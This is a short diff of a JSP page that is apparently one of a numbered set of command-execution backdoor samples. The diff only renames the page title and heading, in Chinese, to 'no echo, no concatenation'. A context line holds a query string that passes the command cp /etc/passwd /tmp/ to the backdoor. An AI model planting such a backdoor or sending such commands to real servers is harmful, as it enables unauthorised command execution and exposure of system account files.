@@ -3,10 +3,10 @@
 <html>
 <head>	
 	<meta charset="UTF-8"/>
-	<title>004 - 命令执行后门（无回显）</title>
+	<title>004 - 命令执行后门（无回显，无拼接）</title>
 </head>
 <body>
-	<h1>004 - 命令执行后门（无回显）</h1>
+	<h1>004 - 命令执行后门（无回显，无拼接）</h1>
 
 <%
 String linux_querystring = "?cmd=cp+/etc/passwd+/tmp/";
